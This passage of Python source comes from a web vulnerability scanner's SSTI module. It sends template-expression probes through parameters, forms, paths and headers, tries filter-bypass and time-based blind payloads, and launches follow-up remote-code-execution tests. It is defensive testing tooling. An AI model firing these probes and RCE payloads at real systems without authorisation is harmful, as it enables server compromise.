        1. Phase 0: Discover SSTI endpoints
        2. Phase 1: Quick fingerprint to detect template engine
        3. Phase 2: Focused testing with engine-specific payloads
        4. Phase 3: WAF bypass and blind testing (only if promising)
        """
        findings: list[dict[str, Any]] = []
        self._partial_findings = []  # Reset partial findings
        self._scan_start_time = time.time()  # G-09 FIX: Track overall scan time
        self._detected_engine = None

        # Helper to extend findings and track for partial recovery
        def extend_findings(new_findings: list[dict[str, Any]]) -> None:
            findings.extend(new_findings)
            self._partial_findings.extend(new_findings)

        # G-09 FIX: Check overall timeout
        def check_timeout() -> bool:
            return (time.time() - self._scan_start_time) >= self.MAX_SCAN_DURATION

        base_url = resolve_base_url(host)
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])
        if isinstance(asset_data, dict):
            urls = asset_data.get("urls", [base_url])
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._ctx.log_context_status()
        self._auth_headers = self._ctx.auth_headers
        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
        self._asset_data = asset_data
        if self._ctx.has_auth:
            logger.info(f"[SSTI] Using authenticated session ({self._ctx.auth_method})")

        # STACK PROFILE: Use template-engine-specific payloads when available
        if isinstance(asset_data, dict):
            runtime_engine = asset_data.get("runtime_engine")
        if isinstance(asset_data, dict):
            stack_profile = asset_data.get("stack_profile")
        self._stack_specific_payloads: list[str] = []
        if runtime_engine and stack_profile:
            try:
                ssti_payloads = runtime_engine.get_ssti_payloads(stack_profile)
                if ssti_payloads:
                    self._stack_specific_payloads = ssti_payloads
                    tpl_type = stack_profile.get("template_engine", "unknown") if isinstance(stack_profile, dict) else getattr(stack_profile, "template_engine", "unknown")
                    logger.info(f"[SSTI] Using {len(ssti_payloads)} stack-specific payloads for {tpl_type}")
            except Exception as e:
                logger.debug(f"[SSTI] Could not get stack-specific payloads: {e}")

        # TOOL DISCOVERED PARAMS: Test parameters found by arjun
        if isinstance(asset_data, dict):
            tool_discovered_params = asset_data.get("tool_discovered_params") or {}
        if tool_discovered_params:
            logger.info(f"[SSTI] Using {len(tool_discovered_params)} parameter sets discovered by arjun")
            # Add discovered params to endpoints for testing
            for endpoint_url, params in tool_discovered_params.items():
                if params and endpoint_url not in endpoints:
                    for param in params[:5]:  # Test up to 5 params per endpoint
                        test_url = f"{endpoint_url}?{param}=test"
                        endpoints.append(test_url)

        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
        endpoint_params: dict[str, list[str]] = {}
        vuln_type_hints: dict[str, list[str]] = {}
        if isinstance(asset_data, dict):
            endpoint_params = asset_data.get("endpoint_params", {})
            vuln_type_hints = asset_data.get("vuln_type_hints", {})
        if endpoint_params:
            logger.info(f"[SSTI] Received {len(endpoint_params)} endpoints with params from metadata discovery")

        # Add metadata-discovered endpoints with SSTI hints
        ssti_hint_types = {"SSTI", "SERVER_SIDE_TEMPLATE_INJECTION", "TEMPLATE_INJECTION"}
        for ep_url, hints in vuln_type_hints.items():
            if not any(h in ssti_hint_types for h in hints):
                continue
            # Normalize URL
            if ep_url.startswith("/"):
                full_url = f"{base_url}{ep_url}"
            elif not ep_url.startswith("http"):
                full_url = f"{base_url}/{ep_url}"
            else:
                full_url = ep_url
            # Add with parameters
            params = endpoint_params.get(ep_url, ["template", "name", "input", "text", "content"])
            for param in params[:3]:  # Limit to 3 params
                test_url = f"{full_url}?{param}=test" if "?" not in full_url else f"{full_url}&{param}=test"
                if test_url not in endpoints:
                    endpoints.append(test_url)
                    logger.debug(f"[SSTI] Adding metadata endpoint: {test_url}")
        if vuln_type_hints:
            ssti_hinted = sum(1 for hints in vuln_type_hints.values() if any(h in ssti_hint_types for h in hints))
            if ssti_hinted > 0:
                logger.info(f"[SSTI] Added {ssti_hinted} endpoints with SSTI hints")

        # SHARED FINDINGS STORE: Cross-module targeting
        if isinstance(asset_data, dict):
            shared_store = asset_data.get("shared_findings_store")
        if shared_store:
            from utils.shared_findings_store import VulnType
            existing = set(endpoints + urls)
            # SSTI often works where XSS/reflection works
            for vtype in [VulnType.XSS, VulnType.DOM_XSS]:
                for sf in shared_store.get_findings_by_type(vtype):
                    if sf.endpoint and sf.endpoint not in existing:
                        endpoints.append(sf.endpoint)
                        logger.debug(f"[SSTI] Cross-module target from {sf.module}: {sf.endpoint}")

        # Combine all testable URLs and FILTER OUT static assets
        all_urls_raw = list(set(endpoints + urls))

        # CRITICAL: Skip static assets to prevent false positives
        all_urls = []
        skipped_static = 0
        for url in all_urls_raw:
            if is_static_asset_url(url):
                skipped_static += 1
                logger.debug(f"Skipping static asset: {url}")
            else:
                all_urls.append(url)

        if skipped_static > 0:
            logger.info(f"🛡️ SSTI Scanner: Skipped {skipped_static} static assets (false positive prevention)")

        all_urls = all_urls[:50]

        # TIMEOUT-FIX 2026-02-12: Initialize progress tracking
        self._endpoints_without_findings = 0

        async with get_scan_client(
            timeout=self.timeout,
            custom_headers=self._auth_headers if hasattr(self, "_auth_headers") else None,
        ) as client:
            # G-09 FIX: Phase 0 - Discover SSTI endpoints proactively
            discovered_ssti = await self._discover_ssti_endpoints(client, base_url, rate_limiter)
            if discovered_ssti:
                logger.info(f"[SSTI] Discovered {len(discovered_ssti)} potential SSTI endpoints")
                # Add discovered to front of list (higher priority)
                all_urls = discovered_ssti + [u for u in all_urls if u not in discovered_ssti]

            # G-09 FIX: Phase 1 - Quick fingerprint on first few endpoints
            if not check_timeout():
                engine = await self._fingerprint_template_engine(client, all_urls[:5], rate_limiter)
                if engine:
                    self._detected_engine = engine
                    logger.info(f"[SSTI] Fingerprinted template engine: {engine.name}")

            for url in all_urls:
                # G-09 FIX: Check overall timeout
                if check_timeout():
                    logger.info(f"[SSTI] Overall timeout ({self.MAX_SCAN_DURATION}s) - returning partial results")
                    break

                # TIMEOUT-FIX 2026-02-12: Early exit if no progress
                if self._endpoints_without_findings >= self._max_no_progress_endpoints:
                    logger.info(f"[SSTI] No findings after {self._endpoints_without_findings} endpoints, skipping remaining")
                    break

                try:
                    # TIMEOUT-FIX 2026-02-12: Per-endpoint timeout
                    async with asyncio.timeout(self.endpoint_timeout):
                        # Phase 2: Test URL parameters (uses detected engine if available)
                        param_findings = await self._test_url_params_enterprise(
                            client, url, rate_limiter
                        )
                        extend_findings(param_findings)

                        # G-09 FIX: Skip expensive tests if timeout approaching
                        if check_timeout():
                            break

                        # Phase 3: Test form inputs
                        form_findings = await self._test_forms_enterprise(
                            client, url, rate_limiter
                        )
                        extend_findings(form_findings)

                        # Phase 4: Test path-based injection
                        path_findings = await self._test_path_injection_enterprise(
                            client, url, rate_limiter
                        )
                        extend_findings(path_findings)

                        # G-09 FIX: Headers/WAF/Blind only if we have time
                        if (time.time() - self._scan_start_time) < self.MAX_SCAN_DURATION * 0.7:
                            # Phase 5: Test headers
                            header_findings = await self._test_headers_enterprise(
                                client, url, rate_limiter
                            )
                            extend_findings(header_findings)

                            # Phase 6: WAF bypass testing
                            waf_findings = await self._test_waf_bypass(
                                client, url, rate_limiter
                            )
                            extend_findings(waf_findings)

                            # Phase 7: Blind SSTI detection (only if promising findings)
                            if findings:
                                blind_findings = await self._test_blind_ssti(
                                    client, url, rate_limiter
                                )
                                extend_findings(blind_findings)

                        # Track progress
                        found_any = param_findings or form_findings or path_findings or header_findings or waf_findings or blind_findings
                        if found_any:
                            self._endpoints_without_findings = 0  # Reset on finding
                        else:
                            self._endpoints_without_findings += 1
                except asyncio.TimeoutError:
                    logger.warning(f"[SSTI] Endpoint timeout after {self.endpoint_timeout}s: {url}")
                    self._endpoints_without_findings += 1
                except Exception as e:
                    logger.debug(f"[SSTI] Error testing URL {url}: {e}")

        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        try:
            from utils.shared_findings_store import SharedFindingsStore, VulnType
            store = SharedFindingsStore.get_instance()
            for f in findings:
                if isinstance(f, dict):
                    metadata = f.get("metadata", {})
                    await store.add_finding(
                        {
                            "type": VulnType.SSTI,
                            "endpoint": f.get("matched_at") or metadata.get("url", ""),
                            "severity": f.get("severity", "HIGH"),
                            "parameter": metadata.get("param") or metadata.get("vulnerable_param", ""),
                            "template_engine": metadata.get("template_engine", ""),
                        },
                        module="ssti",
                    )
            if findings:
                logger.debug(f"[SSTI] Shared {len(findings)} findings to cross-module store")
        except Exception as e:
            logger.debug(f"[SSTI] Could not share findings: {e}")

        return {"findings": findings}
    
    async def _test_url_params_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test URL parameters with comprehensive payload coverage.
        """
        findings = []
        
        # Extended parameter names to test
        test_params = [
            "name", "template", "page", "view", "content", "message",
            "text", "title", "body", "data", "input", "query", "search",
            "email", "username", "comment", "description", "preview",
            "render", "output", "display", "format", "layout", "theme",
            "lang", "locale", "file", "path", "url", "redirect", "return",
            "callback", "next", "goto", "ref", "action", "cmd", "exec",
            "tpl", "tmpl", "doc", "html", "raw", "debug", "test",
        ]
        
        # Parse existing parameters from URL
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        all_params = list(set(test_params + list(existing_params.keys())))
        
        for param in all_params[:20]:  # Limit to avoid excessive testing
            # PERF-FIX 2026-02-20: Try intelligent payload selection first
            intelligent_payloads = await self._get_intelligent_payloads(
                category="ssti",
                endpoint=url,
                param_name=param,
                max_payloads=30,
                asset_data=getattr(self, '_asset_data', None),
            )

            # Build detection payloads list - prioritize intelligent if available
            if intelligent_payloads:
                # Convert intelligent payloads to detection format
                # intelligent_payloads is list of (payload_str, metadata_dict)
                detection_payloads = []
                for payload_str, meta in intelligent_payloads:
                    detection_payloads.append({
                        "payload": payload_str,
                        "expected": meta.get("expected", "1333189"),  # Default SSTI marker
                        "engines": meta.get("engines", []),
                    })
                # Add remaining polyglot payloads (already seen payloads will naturally fail duplicate check)
                existing_payload_strs = {d["payload"] for d in detection_payloads}
                for poly in POLYGLOT_DETECTION_PAYLOADS:
                    if poly["payload"] not in existing_payload_strs:
                        detection_payloads.append(poly)
                logger.debug(f"[SSTI] Using {len(intelligent_payloads)} intelligent + {len(POLYGLOT_DETECTION_PAYLOADS)} polyglot payloads for {param}")
            else:
                # Fallback to standard polyglot payloads
                detection_payloads = POLYGLOT_DETECTION_PAYLOADS[:10]

            # Test with selected payloads
            for detection in detection_payloads[:30]:  # Cap at 30 payloads per param
                await rate_limiter.acquire()

                payload = detection["payload"]
                expected = detection.get("expected", "1333189")
                
                try:
                    test_url = self._build_test_url(url, param, payload)
                    response = await client.get(test_url)
                    
                    result = self._analyze_ssti_response(
                        response.text, payload, expected
                    )

                    if result.vulnerable:
                        # GAP-2 FIX 2026-02-13: Negative control check
                        # Verify the expected result doesn't appear with benign input
                        is_valid = await self.quick_negative_control(
                            http_client=client,
                            url=url,
                            param=param,
                            indicator=expected,
                            vuln_vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                        )
                        if not is_valid:
                            logger.debug(f"[SSTI] Negative control failed for {param}: '{expected}' appears with benign input")
                            continue  # Skip this FP

                        # Confirmed SSTI - identify engine
                        engine = await self._identify_engine_enterprise(
                            client, url, param, rate_limiter
                        )

                        finding = Finding(
                            vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                            name=f"Server-Side Template Injection ({engine.name if engine else 'Unknown'})",
                            severity=Severity.CRITICAL,
                            confidence_score=result.confidence * 100,  # Convert 0-1 to 0-100
                            description=f"SSTI vulnerability detected in parameter '{param}'. "
                                       f"Template engine: {engine.name if engine else 'Unknown'}. "
                                       f"Template expressions are being evaluated server-side.",
                            host=urlparse(url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Parameter: {param}",
                                f"Payload: {payload}",
                                f"Expected result: {expected}",
                                f"Confidence: {result.confidence:.0%}",
                                f"Engine indicators: {', '.join(result.evidence)}",
                                "Note: Negative control passed (result absent with benign input)",
                            ],
                            cvss_score=9.8,
                            cwe_id="CWE-94",
                            remediation="Never pass user input directly to template engines. "
                                       "Use logic-less templates (Mustache) or strict sandboxing. "
                                       "Implement input validation and output encoding. "
                                       "Consider using template engines with auto-escaping.",
                        ).to_dict()

                        findings.append(finding)
                        
                        # Test for RCE
                        if engine:
                            rce_findings = await self._test_rce_enterprise(
                                client, url, param, engine, rate_limiter
                            )
                            findings.extend(rce_findings)
                        
                        # FN-C1 FIX: Removed break - test ALL params for SSTI
                        # Multiple params may be vulnerable with different engines

                except Exception as e:
                    logger.debug(f"SSTI test error: {e}")
        
        return findings
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _analyze_ssti_response(
        self,
        response_text: str,
        payload: str,
        expected: str,
    ) -> SSTITestResult:
        """Analyze response to determine if SSTI is present."""
        result = SSTITestResult(vulnerable=False)
        
        # Check if expected result is in response
        if expected in response_text:
            # Make sure the payload itself isn't just reflected
            if payload not in response_text:
                result.vulnerable = True
                result.confidence = 0.9
                result.response_indicator = expected
                result.evidence.append(f"Expected '{expected}' found in response")
                return result
            else:
                # Payload reflected but result also present - might be partial evaluation
                if response_text.count(expected) > response_text.count(payload):
                    result.vulnerable = True
                    result.confidence = 0.7
                    result.evidence.append("Partial template evaluation detected")
                    return result
        
        # Check for error messages that indicate template processing
        error_indicators = [
            "UndefinedError", "TemplateError", "SyntaxError",
            "ParseError", "Template", "render", "compile",
        ]
        
        for indicator in error_indicators:
            if indicator in response_text:
                result.evidence.append(f"Template error indicator: {indicator}")
                # Error indicates template processing even if not vulnerable
        
        return result
    
    async def _identify_engine_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        rate_limiter: RateLimiter,
    ) -> Optional[TemplateEngine]:
        """
        Enterprise: Identify template engine using multiple techniques.
        """
        engine_scores: dict[TemplateEngine, int] = {e: 0 for e in TemplateEngine}
        
        for engine, config in ENGINE_SPECIFIC_DETECTION.items():
            # FN-C2 FIX: Test more payloads for engine detection (was [:5])
            for payload_config in config["payloads"][:10]:
                await rate_limiter.acquire()
                
                try:
                    test_url = self._build_test_url(url, param, payload_config["payload"])
                    response = await client.get(test_url)
                    
                    if payload_config["expected"] in response.text:
                        if payload_config.get("unique"):
                            engine_scores[engine] += 3  # Strong indicator
                        else:
                            engine_scores[engine] += 1
                    
                    # Check for error signatures
                    for sig in config.get("error_signatures", []):
                        if sig in response.text:
                            engine_scores[engine] += 2

                except Exception as e:
                    # FN-H5 FIX: Log exceptions
                    logger.debug(f"SSTI engine detection failed for {engine}: {e}")
                    continue

        # Return engine with highest score
        if max(engine_scores.values()) > 0:
            return max(engine_scores, key=engine_scores.get)
        
        return None
    
    async def _test_rce_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        engine: TemplateEngine,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test RCE payloads for confirmed engine.
        """
        findings = []
        rce_payloads = RCE_PAYLOADS.get(engine, [])
        
        # RCE indicators
        rce_indicators = [
            ("uid=", "Linux user id"),
            ("gid=", "Linux group id"),
            ("root:", "passwd file"),
            ("www-data:", "web user"),
            ("nobody:", "nobody user"),
            ("Runtime", "Java runtime"),
            ("ProcessBuilder", "Java process"),
            ("subprocess", "Python subprocess"),
            ("Popen", "Python Popen"),
            ("child_process", "Node.js"),
        ]
        
        # FN-C2 FIX: Test more RCE payloads (was [:5])
        for payload in rce_payloads[:15]:
            await rate_limiter.acquire()
            
            try:
                test_url = self._build_test_url(url, param, payload)
                response = await client.get(test_url)
                
                for indicator, desc in rce_indicators:
                    if indicator in response.text:
                        # Extract actual command output from response
                        rce_output = ""
                        text = response.text
                        idx = text.find(indicator)
                        if idx >= 0:
                            # Grab context around the indicator (100 chars before/after)
                            start = max(0, idx - 50)
                            end = min(len(text), idx + 200)
                            rce_output = text[start:end].strip()

                        findings.append(Finding(
                            vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                            name=f"SSTI Remote Code Execution Confirmed ({engine.name})",
                            severity=Severity.CRITICAL,
                            description=f"Remote code execution confirmed via SSTI in {engine.name}. "
                                       f"Attacker can execute arbitrary commands on the server.",
                            host=urlparse(url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Engine: {engine.name}",
                                f"RCE payload: {payload[:100]}...",
                                f"RCE indicator: {indicator} ({desc})",
                                f"Command output captured: {rce_output[:300]}" if rce_output else "Output present but not extracted",
                            ],
                            cvss_score=10.0,
                            cwe_id="CWE-94",
                            remediation="CRITICAL: Immediate action required. "
                                       "This vulnerability allows full server compromise. "
                                       "Patch the application immediately.",
                            metadata={
                                "rce_confirmed": True,
                                "rce_output": rce_output[:500] if rce_output else None,
                                "rce_payload": payload,
                                "template_engine": engine.name,
                            },
                        ).to_dict())
                        return findings  # One RCE confirmation is enough
                        
            except Exception as e:
                logger.debug(f"RCE test error: {e}")
        
        return findings
    
    async def _test_forms_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test form inputs with comprehensive coverage.
        """
        findings = []
        
        await rate_limiter.acquire()
        
        try:
            response = await client.get(url)
            
            # Extract form inputs
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
            select_pattern = r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>'
            
            inputs = re.findall(input_pattern, response.text, re.IGNORECASE)
            textareas = re.findall(textarea_pattern, response.text, re.IGNORECASE)
            selects = re.findall(select_pattern, response.text, re.IGNORECASE)
            
            all_inputs = list(set(inputs + textareas + selects))
            
            for input_name in all_inputs[:15]:
                for detection in POLYGLOT_DETECTION_PAYLOADS[:5]:
                    await rate_limiter.acquire()
                    
                    try:
                        data = {input_name: detection["payload"]}
                        post_resp = await client.post(url, data=data)
                        
                        if detection["expected"] in post_resp.text:
                            if detection["payload"] not in post_resp.text:
                                findings.append(Finding(
                                    vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                                    name="SSTI in Form Input",
                                    severity=Severity.CRITICAL,
                                    description=f"SSTI via form input '{input_name}'",
                                    host=urlparse(url).netloc,
                                    endpoint=url,
                                    evidence=[
                                        f"Input: {input_name}",
                                        f"Payload: {detection['payload']}",
                                        f"Result: {detection['expected']}",
                                    ],
                                    cvss_score=9.8,
                                    cwe_id="CWE-94",
                                    remediation="Sanitize all form inputs before template processing.",
                                ).to_dict())
                                break

                    except Exception as e:
                        # FN-H5 FIX: Log exceptions
                        logger.debug(f"SSTI form test failed for {input_name}: {e}")
                        continue

        except Exception as e:
            logger.debug(f"Form test error: {e}")
        
        return findings
    
    async def _test_path_injection_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test path-based SSTI with multiple patterns.
        """
        findings = []
        
        # Extended path patterns - use UNIQUE numbers to prevent false positives
        # 1337*997 = 1333189 (won't appear naturally in pages)
        path_patterns = [
            "/page/{{1337*997}}",
            "/template/{{1337*997}}",
            "/render/{{1337*997}}",
            "/view/{{1337*997}}",
            "/preview/{{1337*997}}",
            "/{{1337*997}}",
            "/api/template/{{1337*997}}",
            "/content/{{1337*997}}",
            "/${1337*997}",
            "/{{config}}",
            "/{{self}}",
            "/<%= 1337*997 %>",
            "/#{1337*997}",
            # URL encoded variants
            "/page/%7b%7b1337*997%7d%7d",
            "/template/%24%7b1337*997%7d",
        ]

        for path in path_patterns:
            await rate_limiter.acquire()

            try:
                url = urljoin(base_url, path)
                response = await client.get(url, follow_redirects=True)

                # Check for template evaluation - UNIQUE number 1333189
                if "1333189" in response.text:
                    # Verify it's not just the payload reflected
                    if "{{1337*997}}" not in response.text and "${1337*997}" not in response.text:
                        findings.append(Finding(
                            vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                            name="SSTI in URL Path",
                            severity=Severity.CRITICAL,
                            description="URL path is processed by template engine. "
                                       "Route parameters are being evaluated.",
                            host=urlparse(base_url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Vulnerable path: {path}",
                                "Template expression evaluated in URL path",
                            ],
                            cvss_score=9.8,
                            cwe_id="CWE-94",
                            remediation="Do not use template engines to process URL paths. "
                                       "Use parameterized routes with strict validation.",
                        ).to_dict())
                        break
                        
            except Exception as e:
                logger.debug(f"Path injection test error: {e}")
        
        return findings
    
    async def _test_headers_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test HTTP headers for SSTI.
        """
        findings = []
        
        # Extended header tests - use UNIQUE numbers (1337*997=1333189)
        test_headers = [
            ("User-Agent", "{{1337*997}}"),
            ("Referer", "{{1337*997}}"),
            ("X-Forwarded-For", "{{1337*997}}"),
            ("X-Forwarded-Host", "{{1337*997}}"),
            ("Accept-Language", "{{1337*997}}"),
            ("X-Original-URL", "{{1337*997}}"),
            ("X-Custom-Header", "{{1337*997}}"),
            ("Cookie", "session={{1337*997}}"),
            ("Authorization", "Bearer {{1337*997}}"),
            ("Content-Type", "application/{{1337*997}}"),
            ("Accept", "text/{{1337*997}}"),
            # Alternative syntaxes
            ("User-Agent", "${1337*997}"),
            ("User-Agent", "<%= 1337*997 %>"),
        ]

        for header_name, payload in test_headers:
            await rate_limiter.acquire()

            try:
                headers = {header_name: payload}
                response = await client.get(url, headers=headers)

                if "1333189" in response.text:
                    # Verify not reflected as-is
                    if payload not in response.text:
                        findings.append(Finding(
                            vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                            name=f"SSTI via HTTP Header ({header_name})",
                            severity=Severity.CRITICAL,
                            description=f"Header '{header_name}' is processed by template engine",
                            host=urlparse(url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Vulnerable header: {header_name}",
                                f"Payload: {payload}",
                            ],
                            cvss_score=9.8,
                            cwe_id="CWE-94",
                            remediation="Never process HTTP headers through template engines. "
                                       "Headers should be validated and sanitized separately.",
                        ).to_dict())
                        break
                        
            except Exception as e:
                logger.debug(f"Header test error: {e}")
        
        return findings
    
    async def _test_waf_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test WAF/filter bypass techniques.
        """
        findings = []
        
        # First check if basic payload is blocked - use UNIQUE number
        await rate_limiter.acquire()
        try:
            test_url = f"{url}?test={{{{1337*997}}}}"
            baseline = await client.get(test_url)

            # If basic payload works (unique number 1333189 appears), no need for bypass testing
            if "1333189" in baseline.text and "{{1337*997}}" not in baseline.text:
                return findings

        except Exception:
            return findings

        # Try bypass techniques (these use 7*7 for WAF testing - result would still show 49)
        # Note: WAF bypass testing is less likely to cause false positives since it
        # only runs AFTER the basic test fails (meaning the target actually processes templates)
        for bypass in WAF_BYPASS_PAYLOADS[:15]:
            await rate_limiter.acquire()

            try:
                # Update bypass payload to use unique numbers
                bypass_payload = bypass["bypass"].replace("7*7", "1337*997")
                test_url = f"{url}?test={quote(bypass_payload)}"
                response = await client.get(test_url)

                if "1333189" in response.text:
                    findings.append(Finding(
                        vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                        name=f"SSTI WAF Bypass ({bypass['type']})",
                        severity=Severity.HIGH,
                        description=f"WAF/filter bypass successful using {bypass['type']}. "
                                   "Input filtering can be circumvented.",
                        host=urlparse(url).netloc,
                        endpoint=url,
                        evidence=[
                            f"Bypass type: {bypass['type']}",
                            f"Original: {bypass['original']}",
                            f"Bypass payload: {bypass_payload}",
                        ],
                        cvss_score=8.1,
                        cwe_id="CWE-94",
                        remediation="Implement proper input sanitization at the application level. "
                                   "WAF rules are not sufficient for SSTI prevention.",
                    ).to_dict())
                    break
                    
            except Exception as e:
                logger.debug(f"WAF bypass test error: {e}")
        
        return findings
    
    async def _test_blind_ssti(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test for blind SSTI using time-based detection.
        """
        findings = []
        
        for blind_test in BLIND_SSTI_PAYLOADS[:3]:  # Limit time-based tests
            await rate_limiter.acquire()
            
            try:
                payload = blind_test["payload"]
                expected_delay = blind_test["delay"]
                engine = blind_test["engine"]
                
                test_url = f"{url}?test={quote(payload)}"
                
                start_time = time.time()
                response = await client.get(test_url, timeout=expected_delay + 3)
                elapsed = time.time() - start_time
                
                # Check if response was delayed
                if elapsed >= expected_delay * 0.8:  # Allow 20% tolerance
                    findings.append(Finding(
                        vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                        name=f"Blind SSTI Detected ({engine})",
                        severity=Severity.HIGH,
                        description=f"Time-based blind SSTI detected. "
                                   f"Template engine appears to be {engine}. "
                                   f"Response delayed by ~{elapsed:.1f}s.",
                        host=urlparse(url).netloc,
                        endpoint=url,
                        evidence=[
                            f"Engine: {engine}",
                            f"Expected delay: {expected_delay}s",
                            f"Actual delay: {elapsed:.1f}s",
                            f"Payload: {payload[:100]}...",
                        ],
                        cvss_score=8.1,
                        cwe_id="CWE-94",
                        remediation="Investigate and patch the blind SSTI vulnerability. "
                                   "Even without direct output, this can lead to RCE.",
                    ).to_dict())
                    break
                    
            except asyncio.TimeoutError:
                # Timeout might indicate successful sleep
                findings.append(Finding(
                    vuln_type=VulnType.SSTI,
                        category=VulnCategory.INJECTION,
                    name=f"Potential Blind SSTI ({blind_test['engine']})",
                    severity=Severity.MEDIUM,
                    description="Request timeout may indicate blind SSTI. Timing-based detection - timeout consistent with sleep payload.",
                    host=urlparse(url).netloc,
                    endpoint=url,
                    evidence=[f"Request timed out with sleep payload"],
                    cvss_score=6.5,
                    cwe_id="CWE-94",
                    remediation="Investigate potential blind SSTI vulnerability.",
                ).to_dict())
                
            except Exception as e:
                logger.debug(f"Blind SSTI test error: {e}")
        
        return findings
    
    def _identify_engine(self, response_text: str) -> str | None:
        """Identify the template engine from response (legacy method)."""
        response_lower = response_text.lower()
        
        for engine, signatures in self.ENGINE_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in response_lower:
                    return engine
        
        # Try to identify by behavior
        if "7777777" in response_text:  # {{7*'7'}} result
            return "jinja2"
        
        return None
